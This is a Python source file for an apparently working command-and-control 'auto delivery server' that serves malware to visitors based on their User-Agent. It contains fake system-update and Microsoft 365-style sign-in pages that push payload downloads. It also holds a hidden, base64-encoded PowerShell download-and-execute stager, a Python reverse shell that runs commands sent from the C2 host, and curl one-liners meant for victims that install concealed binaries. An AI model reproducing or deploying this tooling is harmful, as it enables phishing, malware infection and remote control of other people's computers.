#!/usr/bin/env python3
"""
WORLDC2 C2 — Auto Delivery Server
Sets up HTTP server with auto-generated stagers and payloads.
Victims visiting the URL get served the appropriate payload based on User-Agent.

Usage:
    python3 delivery.py                    # Auto-detect IP, port 8000
    python3 delivery.py --port 80          # Custom port
    python3 delivery.py --phishing         # Enable phishing landing page
    python3 delivery.py --redirect         # Redirect after payload delivery
"""

import os
import sys
import socket
import argparse
import subprocess
import threading
import base64
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler
from datetime import datetime

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

PROJECT_ROOT = Path(__file__).parent.parent
PAYLOADS_DIR = PROJECT_ROOT / "payloads"
AUTOEXEC_DIR = PAYLOADS_DIR / "autoexec"

class DeliveryHandler(SimpleHTTPRequestHandler):
    """HTTP handler that serves appropriate payload based on User-Agent."""
    
    server_addr = "127.0.0.1:8443"
    redirect_url = ""
    phishing_mode = False
    
    def log_message(self, format, *args):
        """Custom logging with colors."""
        client = self.client_address[0]
        ua = self.headers.get('User-Agent', '')[:60]
        print(f"  {CYAN}[{self.address_string()}]{RESET} {format % args} {YELLOW}({ua}){RESET}")
    
    def do_GET(self):
        ua = self.headers.get('User-Agent', '').lower()
        
        # Log the visit
        print(f"{GREEN}[+]{RESET} Visit from {self.client_address[0]}")
        
        # Smart payload selection based on User-Agent
        if 'windows' in ua:
            if 'powershell' in ua or 'winhttp' in ua:
                self.serve_ps1_stager()
            elif 'mshta' in ua:
                self.serve_hta()
            else:
                self.serve_windows_payload()
        elif 'linux' in ua:
            self.serve_linux_payload()
        elif 'darwin' in ua or 'mac' in ua:
            self.serve_darwin_payload()
        elif 'python' in ua:
            self.serve_python_payload()
        elif 'curl' in ua or 'wget' in ua:
            self.serve_curl_instructions()
        else:
            if self.phishing_mode:
                self.serve_phishing_page()
            else:
                self.serve_index()
    
    def serve_index(self):
        """Serve a generic index page."""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        html = f"""<html>
<head><title>System Update Required</title></head>
<body style="font-family:Arial,sans-serif;max-width:600px;margin:40px auto;padding:20px;">
<h2>System Update Required</h2>
<p>Your system requires an update. Please download and run the appropriate update package:</p>
<ul>
<li><a href="/update.exe">Windows Update</a></li>
<li><a href="/update.sh">Linux Update</a></li>
<li><a href="/update.dmg">macOS Update</a></li>
</ul>
<p style="color:#999;font-size:12px;">If you did not request this update, please contact your system administrator.</p>
</body>
</html>"""
        self.wfile.write(html.encode())
    
    def serve_phishing_page(self):
        """Serve a convincing phishing page."""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        html = f"""<html>
<head>
<title>Microsoft 365 — Sign In</title>
<style>
body {{ font-family: 'Segoe UI', sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }}
.container {{ background: white; padding: 44px; border-radius: 2px; box-shadow: 0 2px 6px rgba(0,0,0,.13); width: 440px; }}
.logo {{ color: #059669; font-size: 24px; font-weight: 600; margin-bottom: 24px; }}
input {{ width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 2px; font-size: 15px; margin-bottom: 16px; box-sizing: border-box; }}
button {{ width: 100%; padding: 12px; background: #059669; color: white; border: none; font-size: 15px; cursor: pointer; border-radius: 2px; }}
button:hover {{ background: #047857; }}
.footer {{ font-size: 12px; color: #999; margin-top: 24px; text-align: center; }}
</style>
</head>
<body>
<div class="container">
<div class="logo">WORLDC2</div>
<h3 style="font-weight:400;margin-bottom:20px;">Sign in</h3>
<form onsubmit="event.preventDefault(); downloadPayload();">
<input type="email" placeholder="Email" required />
<input type="password" placeholder="Password" required />
<button type="submit">Sign in</button>
</form>
<div class="footer">© 2024 WORLDC2 Corporation</div>
</div>
<script>
function downloadPayload() {{
    var ua = navigator.userAgent;
    if (ua.indexOf('Windows') > -1) window.location = '/update.exe';
    else if (ua.indexOf('Linux') > -1) window.location = '/update.sh';
    else window.location = '/update.dmg';
}}
</script>
</body>
</html>"""
        self.wfile.write(html.encode())
    
    def serve_windows_payload(self):
        """Serve Windows EXE payload."""
        exe = PROJECT_ROOT / "worldc2-agent.exe"
        if exe.exists():
            self.serve_file(exe, 'application/octet-stream')
        else:
            self.serve_ps1_stager()
    
    def serve_ps1_stager(self):
        """Serve PowerShell stager that downloads and executes the agent."""
        host, _, port = self.server_addr.rsplit(":", 1) if ":" in self.server_addr else (self.server_addr, "", "8443")
        
        ps = f"""$c=New-Object Net.WebClient;$c.DownloadFile('http://{host}:8000/worldc2-agent.exe','$env:TEMP\\\\.update.exe');Start-Process -WindowStyle Hidden '$env:TEMP\\\\.update.exe' -ArgumentList '--server','{self.server_addr}'"""
        
        b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(f"powershell -w hidden -enc {b64}".encode())
    
    def serve_linux_payload(self):
        """Serve Linux ELF payload."""
        elf = PROJECT_ROOT / "worldc2-agent"
        if elf.exists():
            self.serve_file(elf, 'application/octet-stream')
        else:
            self.send_response(404)
            self.end_headers()
    
    def serve_darwin_payload(self):
        """Serve macOS payload."""
        dmg = PROJECT_ROOT / "dist" / "worldc2-agent-darwin-amd64"
        if dmg.exists():
            self.serve_file(dmg, 'application/octet-stream')
        else:
            self.send_response(404)
            self.end_headers()
    
    def serve_python_payload(self):
        """Serve Python agent."""
        self.send_response(200)
        self.send_header('Content-Type', 'text/x-python')
        self.end_headers()
        
        host, _, port = self.server_addr.rsplit(":", 1) if ":" in self.server_addr else (self.server_addr, "", "8443")
        py = f"""import socket,subprocess,os,time
H,P="{host}",{port}
while 1:
 try:
  s=socket.create_connection((H,P),30)
  while 1:
   c=s.recv(4096).decode().strip()
   if c=="kill":s.close();exit()
   r=subprocess.check_output(c,shell=True,stderr=subprocess.STDOUT,timeout=30)
   s.sendall(r)
 except:time.sleep(5)
"""
        self.wfile.write(py.encode())
    
    def serve_curl_instructions(self):
        """Serve curl one-liner for manual execution."""
        host, _, port = self.server_addr.rsplit(":", 1) if ":" in self.server_addr else (self.server_addr, "", "8443")
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        
        cmd = f"curl -s http://{host}:8000/worldc2-agent -o /tmp/.update && chmod +x /tmp/.update && nohup /tmp/.update --server {self.server_addr} &>/dev/null &"
        self.wfile.write(cmd.encode())
    
    def serve_hta(self):
        """Serve HTA payload."""
        hta = AUTOEXEC_DIR / "invoice.hta"
        if hta.exists():
            self.serve_file(hta, 'application/hta')
        else:
            self.serve_phishing_page()
    
    def serve_file(self, path, content_type):
        """Serve a file."""
        with open(path, 'rb') as f:
            data = f.read()
        self.send_response(200)
        self.send_header('Content-Type', content_type)
        self.send_header('Content-Disposition', f'attachment; filename="{path.name}"')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        print(f"{GREEN}[DELIVERED]{RESET} {path.name} ({len(data)} bytes) to {self.client_address[0]}")
        
        # Redirect after delivery if configured
        if self.redirect_url:
            pass  # Could add redirect header


def banner():
    print(f"""{BOLD}{CYAN}
   ╔══════════════════════════════════════════════╗
   ║         WORLDC2 C2 — Auto Delivery Server        ║
   ║         ruby570bocadito                      ║
   ╚══════════════════════════════════════════════╝
{RESET}""")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="WORLDC2 Auto Delivery Server")
    parser.add_argument("--port", "-p", type=int, default=8000, help="HTTP port")
    parser.add_argument("--server", "-s", default=None, help="C2 server address")
    parser.add_argument("--phishing", action="store_true", help="Enable phishing landing page")
    parser.add_argument("--redirect", default="", help="Redirect URL after payload delivery")
    args = parser.parse_args()
    
    local_ip = get_local_ip()
    
    if not args.server:
        args.server = f"{local_ip}:8443"
    
    # Configure handler
    DeliveryHandler.server_addr = args.server
    DeliveryHandler.redirect_url = args.redirect
    DeliveryHandler.phishing_mode = args.phishing
    
    print(f"{BOLD}Configuration:{RESET}")
    print(f"  {BOLD}Local IP:{RESET}   {GREEN}{local_ip}{RESET}")
    print(f"  {BOLD}C2 Server:{RESET}  {args.server}")
    print(f"  {BOLD}HTTP Port:{RESET}  {args.port}")
    print(f"  {BOLD}Phishing:{RESET}   {'Yes' if args.phishing else 'No'}")
    print()
    
    print(f"{BOLD}{YELLOW}Delivery URLs:{RESET}")
    print(f"  {GREEN}http://{local_ip}:{args.port}/{RESET}")
    print(f"  {GREEN}http://{local_ip}:{args.port}/update.exe{RESET}")
    print(f"  {GREEN}http://{local_ip}:{args.port}/update.sh{RESET}")
    print(f"  {GREEN}http://{local_ip}:{args.port}/update.dmg{RESET}")
    print()
    
    print(f"{BOLD}{YELLOW}One-liners for victims:{RESET}")
    print(f"  {CYAN}Windows:{RESET}  powershell -c \"iwr http://{local_ip}:{args.port}/update.exe -OutFile $env:TEMP\\\\.u.exe; Start-Process $env:TEMP\\\\.u.exe\"")
    print(f"  {CYAN}Linux:{RESET}    curl -s http://{local_ip}:{args.port}/update.sh | bash")
    print(f"  {CYAN}macOS:{RESET}    curl -s http://{local_ip}:{args.port}/update.dmg -o /tmp/.u && chmod +x /tmp/.u && /tmp/.u")
    print()
    
    print(f"{BOLD}{RED}Waiting for connections...{RESET}\n")
    
    server = HTTPServer(('0.0.0.0', args.port), DeliveryHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Server stopped.{RESET}")
        server.shutdown()

if __name__ == "__main__":
    main()
